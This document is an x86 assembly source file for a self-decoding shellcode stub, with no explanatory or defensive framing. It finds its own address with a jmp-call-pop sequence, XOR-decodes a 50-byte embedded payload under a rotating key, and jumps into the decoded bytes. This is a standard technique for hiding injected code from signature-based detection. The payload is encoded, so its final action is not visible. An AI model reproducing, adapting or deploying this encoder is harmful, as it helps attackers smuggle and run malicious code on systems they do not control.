.set RW, 0x194c3bfd
.set LEN, 50

.if ARCH == 64
	.set Ecx, %rcx
	.set Esi, %rsi
	.set Eax, %rax
.else
	.set Ecx, %ecx
	.set Esi, %esi
	.set Eax, %eax
.endif

.macro set_Ecx
.if LEN > 0x100				# LEN is 2 bytes long
	xor Ecx, Ecx
	movw $LEN, %cx
.else					# LEN is 1 byte long
	push $LEN
	pop Ecx
.endif					# We now have Ecx == $LEN
.endm

.text
.globl _start
_start:
	set_Ecx
.if ARCH == 64
	xor %rax, %rax
.endif
	movl $RW, %eax

	jmp put_addr
in_stack:
	pop Esi

xorloop:
	xorb %al, -0x1(Esi, Ecx)
	ror %eax
	loop xorloop			# dec Ecx; jnz xorloop

	jmp xoredcode

put_addr:
	call in_stack

xoredcode:
	.ascii "\x6a\x18\x59\xb8\x19\x4c\x3b\xfd\xeb\x0b\x5e\x30\x44\x0e\xff\xd1\xc8\xe2\xf8\xeb\x05\xe8\xf0\xff\xff\xff\x15\xf9\xff\x7f\xbf\xf0\x8d\x1e\x55\x32\x7d\xef\xa9\x6a\x68\xc3\xd5\x2f\x82\xa1\xc7\xcd\xa8\xb2"
